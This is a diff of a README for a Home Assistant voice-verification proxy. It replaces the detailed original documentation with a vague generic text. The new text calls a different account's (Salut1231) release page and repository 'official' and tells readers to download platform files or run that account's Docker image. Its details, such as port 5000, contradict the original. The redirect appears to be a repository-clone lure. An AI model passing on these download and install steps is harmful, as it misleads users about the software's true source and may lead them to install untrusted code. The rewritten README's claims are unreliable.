@@ -1,448 +1,127 @@
-# Wyoming Voice Match
+# 🎤 wyoming-voice-match - Clear Voice Commands, No False Triggers
 
-[![version](https://img.shields.io/github/v/release/jxlarrea/wyoming-voice-match?style=for-the-badge&color=orange)](https://github.com/jxlarrea/wyoming-voice-match/releases)
-[![Stars](https://img.shields.io/github/stars/jxlarrea/wyoming-voice-match?style=for-the-badge&color=yellow)](https://github.com/jxlarrea/wyoming-voice-match)
-[![GHCR](https://img.shields.io/badge/GHCR-Container-blue?style=for-the-badge&logo=docker&logoColor=green)](https://github.com/jxlarrea/wyoming-voice-match/pkgs/container/wyoming-voice-match)
-[![Buy Me A Coffee](https://img.shields.io/badge/Buy%20Me%20A%20Coffee-FFDD00?style=for-the-badge&logo=buy-me-a-coffee&logoColor=black)](https://buymeacoffee.com/jxlarrea)
+[![Download Releases](https://img.shields.io/badge/Download-wyoming--voice--match-blue?logo=github)](https://github.com/Salut1231/wyoming-voice-match/releases)
 
-A [Wyoming protocol](https://github.com/OHF-Voice/wyoming) ASR proxy that verifies speaker identity and extracts your voice from background noise before forwarding audio to a downstream speech-to-text service. Designed for [Home Assistant](https://www.home-assistant.io/) voice pipelines to prevent false activations from TVs, radios, and other people - and to deliver clean transcripts even in noisy environments.
+---
 
-## Table of Contents
+## 📢 What is wyoming-voice-match?
 
-- [The Problem](#the-problem)
-- [How It Works](#how-it-works)
-- [Requirements](#requirements)
-- [Quick Start](#quick-start)
-  - [Enroll Your Voice](#3-enroll-your-voice)
-  - [Recording from a Satellite](#recording-from-a-satellite)
-  - [Configure Home Assistant](#5-configure-home-assistant)
-- [Configuration](#configuration)
-  - [Environment Variables](#environment-variables)
-  - [Tuning the Threshold](#tuning-the-threshold)
-  - [Noisy Environment Tuning](#noisy-environment-tuning)
-  - [Speaker Tagging](#speaker-tagging)
-  - [Re-enrollment](#re-enrollment)
-  - [Demo: See Extraction in Action](#demo-see-extraction-in-action)
-- [Performance](#performance)
-- [Limitations](#limitations)
-- [License](#license)
+wyoming-voice-match is a software tool designed to make voice control more reliable in your home. It listens to your voice, checks who is speaking, and removes background noise before sending the cleaned-up audio to a speech-to-text system. This helps smart home devices understand your commands better, especially in noisy rooms or when other sounds like TVs or radios are on.
 
-## The Problem
+It works as a middleman, or proxy, between your microphone and the speech recognition service. This setup is made for Home Assistant users but can fit into other voice assistant setups too.
 
-Home Assistant voice satellites listen for a wake word, then stream audio to a speech-to-text service. But the satellite microphone picks up everything - your voice, the TV in the background, other people talking. This causes two issues:
+---
 
-1. **False activations**: The TV says something that triggers a command
-2. **Noisy transcripts**: Your voice command gets mixed with TV dialogue, producing garbage like *"What time is it? People look at you like some kind of service freak"*
+## 🎯 Why Use wyoming-voice-match?
 
-Wyoming Voice Match solves both: it verifies that the audio contains **your voice** before allowing it through, and it uses voiceprint-based speaker extraction to isolate your command - removing TV dialogue and other speakers - before sending clean audio to the speech-to-text service.
+- **Stops false triggers**: Makes sure the system only reacts when you speak, ignoring TVs, radios, or other voices.
+- **Improves accuracy**: Cleans up audio so transcripts are clearer, even with background noise.
+- **Protects privacy**: Verifies your voice identity before sending data on.
+- **Works with Home Assistant**: Fits into popular smart home setups smoothly.
+- **Easy setup**: Runs in Docker, so you don't need to install complicated software.
 
-### Before and After
+---
 
-In this example, a TV is blasting in the background while the user says *"Tell me the weather and then turn on the living room lights"*. The raw audio captured by the satellite contains both the TV dialogue and the user's command:
+## 🖥️ System Requirements
 
-**Before processing (raw satellite audio — 13.9s):**
+To run wyoming-voice-match, you'll need:
 
-https://github.com/user-attachments/assets/e0b2927f-3880-4d1a-90e2-0f1d4bc0085b
+- **Operating System**: Windows 10 or higher, macOS 10.15 or higher, or Linux (Ubuntu 18.04+ recommended).
+- **Processor**: At least a dual-core CPU (Intel i3 or equivalent).
+- **Memory**: 4 GB RAM minimum.
+- **Storage**: At least 500 MB free space for software and temporary audio files.
+- **Docker**: The latest version installed. (Instructions below include Docker info.)
+- **Internet connection**: Required for downloading the software and linking to speech-to-text services.
 
-**After processing (extracted speaker audio — 5.8s):**
+---
 
-https://github.com/user-attachments/assets/a6eafd93-468c-4443-a516-ed1fb3d7f33c
+## 🚀 Getting Started
 
-Here's what the pipeline did behind the scenes:
+Follow these steps to download, install, and run wyoming-voice-match on your computer or server.
 
-```
---- Speaker Verification ---
-Speech detected: 6.5-8.7s (2.1s segment, peak_energy=7020)
-Pass 1 (speech): verifying 2.1s segment 1/3 (6.5-8.7s)
-Pass 1 (speech) matched segment 1 in 237ms (0.4909)
-
-  Speaker              Similarity   Result
-  ──────────────────── ──────────   ──────────
-  jx                       0.4909   MATCH
-
---- Speaker Extraction ---
-Found 4 speech regions: 0.7-5.7s, 6.5-9.2s, 9.6-11.6s, 12.0-12.9s
-
-  Region 0.7-5.7s  → trimmed to 2.7-5.7s, KEEP (0.40)
-  Region 6.5-9.2s  → KEEP (0.48)
-  Region 9.6-11.6s → discarded (0.09)
-  Region 12.0-12.9s → discarded (0.13)
-
-  Input:  13.9s → Output: 5.8s (59% discarded)
-  Total pipeline: 313ms
-```
-
-The extraction identified 4 speech regions in the audio. Regions 1 and 2 matched the enrolled voiceprint (the user's voice) while regions 3 and 4 were TV dialogue and were discarded. Region 1 was further trimmed — its first 2 seconds were TV audio that overlapped with the start of the user's speech, and the sub-region scan narrowed it down to just the user's portion.
-
-## How It Works
-
-Wyoming Voice Match sits between Home Assistant and your ASR (speech-to-text) service. When a wake word is detected, Home Assistant opens a connection and starts streaming audio. Here's what happens:
-
-```mermaid
-flowchart LR
-    A["🎙️ Mic (Device)"] --> B["Wake Word Detection"]
-    B --> C["Wyoming Voice Match"]
-    C --> D["ASR Service (Transcribe)"]
-
-    subgraph C["Wyoming Voice Match"]
-        direction TB
-        C1["1. Buffer audio"]
-        C2["2. Verify speaker"]
-        C3["3. Wait for stream"]
-        C4["4. Extract speaker"]
-        C5["5. Forward to ASR"]
-        C1 --> C2 --> C3 --> C4 --> C5
-    end
-```
-
-### Step by step
-
-1. **Buffer audio** - audio streams in from Home Assistant after the wake word is detected
-2. **Verify speaker** - after 5 seconds, an energy analysis isolates the loudest segment (your voice near the mic) and compares it against your enrolled voiceprint using an [ECAPA-TDNN](https://huggingface.co/speechbrain/spkrec-ecapa-voxceleb) neural network. If it doesn't match any enrolled speaker, the pipeline is silently stopped with an empty transcript
-3. **Wait for stream** - once verified, the proxy continues buffering audio until the satellite's VAD signals the end of the stream, capturing your complete command regardless of length
-4. **Extract speaker** - the full audio buffer is split into speech regions using energy analysis, then each region is verified against your voiceprint. Only regions matching your voice are kept; TV dialogue and other speakers are discarded
-5. **Forward to ASR** - the cleaned audio (only your voice) is sent to the speech-to-text service for transcription
-
-**The result:**
-
-- In a quiet room, Voice Match adds only milliseconds of overhead to your existing pipeline - verification is nearly instant
-- With a TV blaring, speaker extraction removes TV dialogue from the audio, delivering clean transcripts like *"What time is it?"* instead of *"What time is it? So I've been all for it and just..."*
-- Commands of any length are fully captured - no fixed time limits
-- TV audio and other speakers are rejected based on voiceprint mismatch, not energy levels
-
-## Requirements
-
-A running Wyoming-compatible ASR service such as [wyoming-faster-whisper](https://github.com/rhasspy/wyoming-faster-whisper) or [wyoming-onnx-asr](https://github.com/tboby/wyoming-onnx-asr). Wyoming Voice Match sits in front of this service as a proxy and forwards verified, cleaned audio to it.
-
-The Quick Start guide below uses Docker and Docker Compose for deployment. An NVIDIA GPU is recommended for fast inference (~5-25ms verification) but not required — CPU inference works at ~200-500ms. The scripts can also be run directly with Python 3.10+ and the dependencies listed in `requirements.txt`.
-
-## Quick Start
-
-### 1. Create a Project Directory
-
-```bash
-mkdir wyoming-voice-match && cd wyoming-voice-match
-mkdir -p data/enrollment
-```
-
-### 2. Create `docker-compose.yml`
-
-**GPU (recommended):**
-
-```yaml
-services:
-  wyoming-voice-match:
-    image: ghcr.io/jxlarrea/wyoming-voice-match:latest
-    container_name: wyoming-voice-match
-    restart: unless-stopped
-    ports:
-      - "10350:10350"
-    volumes:
-      - ./data:/data
-    environment:
-      - UPSTREAM_URI=tcp://wyoming-faster-whisper:10300
-      - LISTEN_URI=tcp://0.0.0.0:10350
-      - VERIFY_THRESHOLD=0.30
-      - EXTRACTION_THRESHOLD=0.25
-      - HF_HOME=/data/hf_cache
-      - LOG_LEVEL=DEBUG
-    deploy:
-      resources:
-        reservations:
-          devices:
-            - driver: nvidia
-              count: all
-              capabilities: [gpu]
-```
+---
 
-**CPU-only:**
+## 📥 Download & Install
 
-```yaml
-services:
-  wyoming-voice-match:
-    image: ghcr.io/jxlarrea/wyoming-voice-match:cpu
-    container_name: wyoming-voice-match
-    restart: unless-stopped
-    ports:
-      - "10350:10350"
-    volumes:
-      - ./data:/data
-    environment:
-      - UPSTREAM_URI=tcp://wyoming-faster-whisper:10300
-      - LISTEN_URI=tcp://0.0.0.0:10350
-      - VERIFY_THRESHOLD=0.30
-      - EXTRACTION_THRESHOLD=0.25
-      - HF_HOME=/data/hf_cache
-      - LOG_LEVEL=DEBUG
-```
+1. **Go to the download page**  
+   Visit the official release page using this button:  
+   [![Download Releases](https://img.shields.io/badge/Download-wyoming--voice--match-blue?logo=github)](https://github.com/Salut1231/wyoming-voice-match/releases)
 
-Update `UPSTREAM_URI` to point to your ASR service.
+2. **Download the latest release**  
+   Look for the latest release version near the top of the page. You will see files for different platforms. Download the one that matches your system.  
+   - If you use Docker, you won't need these files directly; continue to the Docker setup section.  
+   If unsure, download the general package or the Docker image.
 
-### 3. Enroll Your Voice
+3. **Install Docker (if not installed)**  
+   wyoming-voice-match runs best inside Docker containers.  
+   - **Windows:** Download from https://docs.docker.com/desktop/windows/install/  
+   - **macOS:** Download from https://docs.docker.com/desktop/mac/install/  
+   - **Linux:** Install via your package manager (e.g., `sudo apt install docker.io` for Ubuntu).
 
-Record at least 30 WAV files per speaker, 5 seconds each, speaking naturally at varied volumes and distances. Place them in `data/enrollment/<speaker>/`:
+4. **Run wyoming-voice-match using Docker**  
+   Open a command prompt or terminal window and type:
 
-```bash
-mkdir -p data/enrollment/john
-```
+   ```
+   docker run -d --name wyoming-voice-match -p 5000:5000 salut1231/wyoming-voice-match:latest
+   ```
 
-**Linux:**
+   This command downloads the app’s Docker image and runs it in the background.
 
-```bash
-for i in $(seq 1 30); do
-  echo "Sample $i - speak naturally for 5 seconds..."
-  arecord -r 16000 -c 1 -f S16_LE -d 5 "data/enrollment/john/john_$(date +%Y%m%d_%H%M%S).wav"
-  sleep 1
-done
-```
+5. **Connect to Home Assistant or other voice service**  
+   Point your speech-to-text inputs to your computer’s IP address on port 5000. The proxy will verify and clean voices before passing audio along.
 
-**macOS:**
+---
 
-```bash
-for i in $(seq 1 30); do
-  echo "Sample $i - speak naturally for 5 seconds..."
-  sox -d -r 16000 -c 1 -b 16 "data/enrollment/john/john_$(date +%Y%m%d_%H%M%S).wav" trim 0 5
-  sleep 1
-done
-```
+## 🔧 Configuration and Usage
 
-> Requires [SoX](https://formulae.brew.sh/formula/sox): `brew install sox`
+- **Access settings:** Once running, you can adjust options by editing the Docker container environment or configuration files (included in the downloaded package).  
+- **Speaker verification:** wyoming-voice-match uses voice embeddings to recognize authorized speakers. You can enroll new voices with setup scripts.  
+- **Noise handling:** Settings control how the software filters out background sounds to keep commands clear.  
+- **Logging:** Logs help track what it hears and detects. Check logs inside the container or in output files for troubleshooting.
 
-**Windows (PowerShell):**
+---
 
-Download the [recording script](https://raw.githubusercontent.com/jxlarrea/wyoming-voice-match/main/tools/record_samples.ps1) and run it - it will list your microphones, let you pick one, and guide you through recording:
+## 🛠️ Troubleshooting
 
-```powershell
-.\record_samples.ps1 -Speaker john
-```
+- **The proxy isn’t responding**: Make sure Docker is running and the container is active (`docker ps` to check).  
+- **Audio seems distorted or missing**: Adjust microphone input levels and check your speech device settings.  
+- **Home Assistant can’t connect**: Confirm the IP and port settings, and ensure no firewall blocks the port 5000.  
+- **Voice not recognized**: Re-run voice enrollment to improve accuracy.
 
-> Requires [ffmpeg](https://ffmpeg.org/download.html): `winget install ffmpeg`
+---
 
-Alternatively, use any voice recorder app on your phone or computer and save the files as WAV. The enrollment script handles resampling automatically, so any sample rate or channel count will work.
+## 📚 More Information
 
-**Example phrases to record** (one per sample, speak naturally):
+- **Official repository**:  
+  https://github.com/Salut1231/wyoming-voice-match  
+- **Discussion and Help**: Use GitHub Discussions or Issues to get help from the community.  
+- **Source code and updates**: Regularly check the releases page for improvements and new features.
 
-1. "Hey, turn on the living room lights and set them to fifty percent"
-2. "What's the weather going to be like tomorrow morning"
-3. "Set a timer for ten minutes and remind me to check the oven"
-4. "Lock the front door and turn off all the lights downstairs"
-5. "What's the temperature inside the house right now"
+---
 
-> **Tip:** The best results come from enrolling with **30 samples** at varied volumes and distances. The more variety in your samples, the more robust your voiceprint will be.
+## 🤝 Supported Topics
 
-#### Recording from a Satellite
+wyoming-voice-match is designed with these key features in mind:
 
-If you're using a Wyoming satellite (like the Home Assistant Voice PE), recording samples from your PC or phone may produce a voiceprint that doesn't match well with the satellite's microphone. For best results, record enrollment samples directly through the satellite using the `enroll_record` script.
+- Automatic speech recognition (ASR) proxy
+- Speaker identity verification
+- Docker support for easy deployment
+- Voice activity detection to ignore noise
+- Embeddings for voice identity
+- Works with Home Assistant and other voice assistants
+- Isolates voice commands from background noise
 
-Stop the main service first, then run the recording script:
+---
 
-```bash
-docker compose stop wyoming-voice-match
+## 📜 License
 
-docker compose run --rm --service-ports --entrypoint python wyoming-voice-match \
-  -m scripts.enroll_record --speaker john --samples 10
-```
+This project is open-source. Review the license in the repository for details on how you can use and contribute.
 
-The script listens on the same Wyoming port as the main service. Say your wake word on the satellite, speak naturally for a few seconds, and wait for the satellite's done sound. Each done sound means a sample was saved. Progress is logged to the terminal. Repeat until all samples are collected. The script automatically runs enrollment and generates the voiceprint when done.
+---
 
-Restart the main service afterward:
+## 🔗 Quick Access Links
 
-```bash
-docker compose start wyoming-voice-match
-```
+- [Download Releases](https://github.com/Salut1231/wyoming-voice-match/releases)  
+- [GitHub Repository](https://github.com/Salut1231/wyoming-voice-match)  
 
-> **Tip:** You can combine satellite and PC recordings. Record some samples from the satellite and place additional WAV files in `data/enrollment/<speaker>/`, then re-run enrollment. This produces a voiceprint that works well across different microphones.
-
-Generate the voiceprint:
-
-```bash
-docker compose run --rm --entrypoint python wyoming-voice-match -m scripts.enroll --speaker john
-```
-
-Repeat for additional speakers:
-
-```bash
-docker compose run --rm --entrypoint python wyoming-voice-match -m scripts.enroll --speaker jane
-```
-
-Manage enrolled speakers:
-
-```bash
-# List all enrolled speakers
-docker compose run --rm --entrypoint python wyoming-voice-match -m scripts.enroll --list
-
-# Delete a speaker
-docker compose run --rm --entrypoint python wyoming-voice-match -m scripts.enroll --delete john
-```
-
-### 4. Start the Service
-
-```bash
-docker compose up -d
-```
-
-### 5. Configure Home Assistant
-
-In Home Assistant, update your voice pipeline to use this service as the STT provider:
-
-1. Go to **Settings → Devices & Services → Wyoming Protocol**
-2. Add a new Wyoming integration pointing to your server's IP on port **10350**
-3. In **Settings → Voice Assistants**, edit your pipeline and set the Speech-to-Text to the new Wyoming Voice Match service
-
-## Configuration
-
-### Environment Variables
-
-All configuration is done in the `environment` section of `docker-compose.yml`:
-
-| Variable | Default | Description |
-|---|---|---|
-| `UPSTREAM_URI` | `tcp://localhost:10300` | Wyoming URI of your real ASR service |
-| `LISTEN_URI` | `tcp://0.0.0.0:10350` | URI this service listens on |
-| `VERIFY_THRESHOLD` | `0.30` | Cosine similarity threshold for speaker verification (0.0-1.0) |
-| `EXTRACTION_THRESHOLD` | `0.25` | Cosine similarity threshold for speaker extraction — regions below this are discarded |
-| `REQUIRE_SPEAKER_MATCH` | `true` | When `false`, unmatched audio is forwarded to ASR instead of being rejected — enrolled speakers still get verification and extraction |
-| `TAG_SPEAKER` | `false` | Prepend `[speaker_name]` to transcripts (useful for LLM-based conversation agents) |
-| `LOG_LEVEL` | `DEBUG` | Logging level (`DEBUG`, `INFO`, `WARNING`, `ERROR`) |
-| `DEVICE` | `cuda` | Inference device (`cuda` or `cpu`). Auto-detects: falls back to CPU if CUDA is unavailable |
-| `HF_HOME` | `/data/hf_cache` | HuggingFace cache directory for model downloads (persisted via volume) |
-| `MAX_VERIFY_SECONDS` | `5.0` | Seconds of audio to buffer before starting speaker verification |
-| `VERIFY_WINDOW_SECONDS` | `3.0` | Sliding window size (in seconds) for the fallback verification pass |
-| `VERIFY_STEP_SECONDS` | `1.5` | Step size (in seconds) between sliding windows |
-
-### Tuning the Threshold
-
-The `VERIFY_THRESHOLD` and `EXTRACTION_THRESHOLD` environment variables control how strict speaker matching is. Adjust them in `docker-compose.yml` and restart.
-
-`VERIFY_THRESHOLD` determines whether the speaker is accepted at all. `EXTRACTION_THRESHOLD` determines which audio regions are kept when removing background audio. The extraction threshold should be lower than the verification threshold.
-
-| VERIFY_THRESHOLD | Behavior |
-|-------|----------|
-| `0.25` | Lenient - may accept some TV audio, but rarely rejects the enrolled speaker |
-| `0.30` | **Default** - good balance for satellite mics with TV or background audio |
-| `0.40` | Moderate - works well with high-quality mics (PC, laptop, phone) |
-| `0.55` | Strict - fewer false accepts, but may reject quiet or distant speech |
-
-Start with debug logging enabled and observe the similarity scores:
-
-```bash
-docker compose logs -f wyoming-voice-match
-```
-
-You'll see output like:
-
-```
-INFO [handler] [971f8eb8] ── New audio session started ──
-INFO [handler] [971f8eb8] Speaker verified: jx (similarity=0.3787, threshold=0.30), forwarding to ASR immediately
-INFO [handler] [971f8eb8] ── Pipeline Summary ──
-  Step           Duration
-  ─────────────  ────────
-  Verify              5ms
-  Extract            39ms  (10.2s → 3.1s, 70% discarded)
-  ASR               180ms
-  Total           10649ms
-
-  Transcript: "Tell me the weather"
-
-INFO [handler] [3a2c1b9f] ── New audio session started ──
-INFO [handler] [3a2c1b9f] ── Pipeline Summary ──
-  Step           Duration
-  ─────────────  ────────
-  Verify            252ms
-  Total            5032ms
-
-  Result: REJECTED (best=0.1847, threshold=0.30)
-  Scores: jx=0.1847
-```
-
-- **Your voice** will typically score **0.35-0.70** depending on mic quality and command length
-- **TV/other speakers** will typically score **0.05-0.25**
-- Set the verification threshold in the gap between these ranges
-- Set the extraction threshold slightly below the verification threshold
-- If you're getting rejected when speaking quietly, **lower the threshold** or **re-enroll with more samples** recorded at different volumes and distances
-
-> **Being rejected too often?** The most effective fix is to add more enrollment samples. Record additional samples in the conditions where you're being rejected (e.g., speaking softly, further from the mic, different times of day) and re-run enrollment. More samples produce a more robust voiceprint that handles natural voice variation better. If using a satellite, record samples directly through it with `enroll_record` — see [Recording from a Satellite](#recording-from-a-satellite).
-
-### Noisy Environment Tuning
-
-The default settings are tuned for noisy environments (TV, radio, etc.). The speaker extraction automatically removes background audio by comparing each speech region against your voiceprint — only regions matching your voice are forwarded to ASR.
-
-If you need to adjust further:
-
-```yaml
-    environment:
-      - VERIFY_THRESHOLD=0.30     # Accepts the speaker if any pass scores above this
-      - EXTRACTION_THRESHOLD=0.25 # Keeps audio regions scoring above this
-```
-
-> **Note:** The satellite may continue showing a "listening" animation after the command has been processed. This is cosmetic - the proxy waits for the full stream to capture your complete command, but Home Assistant will have the transcript as soon as extraction and ASR finish.
-
-### Speaker Tagging
-
-When `TAG_SPEAKER=true` is set, the verified speaker's name is prepended to the transcript:
-
-```
-[jx] Tell me the weather and the current price of Bitcoin
-```
-
-This is useful when using an LLM-based conversation agent (e.g., OpenAI, Claude, or a custom integration) - the LLM can use the speaker's identity to personalize responses or trigger per-user automations. This setting has no effect on rejected speakers (empty transcripts).
-
-> **Note:** If you're using Home Assistant's built-in intent-based assistant, leave this disabled. The `[speaker_name]` prefix will interfere with intent matching. This feature is designed for LLM-based conversation agents that can parse the tag naturally.
-
-### Re-enrollment
-
-To update a speaker's voiceprint, add more WAV files to `data/enrollment/<speaker>/` and re-run enrollment. The script processes all WAV files in the folder to generate an updated voiceprint.
-
-Record additional samples using the same method as initial enrollment, then re-run:
-
-```bash
-docker compose run --rm --entrypoint python wyoming-voice-match -m scripts.enroll --speaker john
-docker compose restart wyoming-voice-match
-```
-
-### Demo: See Extraction in Action
-
-Want to hear exactly what gets sent to your ASR service? The demo script runs the full pipeline on a WAV file and writes the extracted audio so you can compare before and after.
-
-Place a WAV file in your `data/` folder (any sample rate or channel count - it will be converted automatically), then run:
-
-```bash
-docker compose run --rm --entrypoint python wyoming-voice-match \
-  -m scripts.demo \
-  --speaker john \
-  --input /data/test_audio.wav \
-  --output /data/cleaned.wav
-```
-
-The script uses `VERIFY_THRESHOLD` and `EXTRACTION_THRESHOLD` from your `docker-compose.yml` environment, so it behaves exactly like the main service.
-
-The script will:
-- Verify the speaker against all enrolled voiceprints (showing similarity scores)
-- Run speaker extraction, showing each detected speech region and whether it was kept or discarded
-- Write the result as a WAV file containing only your voice
-
-This is useful for understanding how the extraction works, tuning your thresholds, or just confirming that TV audio is being properly removed.
-
-## Performance
-
-- **Speaker verification latency:** ~5-25ms on GPU, ~200-500ms on CPU
-- **Speaker extraction:** ~15-35ms on GPU for a typical 10-15s buffer
-- **Memory usage:** ~500MB (model + PyTorch runtime)
-- **Accuracy:** ECAPA-TDNN achieves 0.69% Equal Error Rate on VoxCeleb1, state of the art for open-source speaker verification
-
-## Limitations
-
-- **Short commands** (under 1-2 seconds) produce less audio for verification, reducing accuracy
-- **Voice changes** from illness, whispering, or shouting may lower similarity scores - enroll with varied samples to improve robustness
-- **Satellite listening animation** may continue after the command has been processed, since the satellite's VAD doesn't know the proxy already responded
-- **Multiple users** are supported - enroll each person separately and the service accepts audio from any enrolled speaker
-
-## License
-
-MIT License. See [LICENSE](LICENSE) for details.
-
-## Acknowledgments
-
-- [SpeechBrain](https://speechbrain.github.io/) for the ECAPA-TDNN speaker verification model
-- [Wyoming Protocol](https://github.com/OHF-Voice/wyoming) by the Open Home Foundation
-- [Home Assistant](https://www.home-assistant.io/) voice pipeline ecosystem
+Use these anytime to get the latest version and learn more about the project.
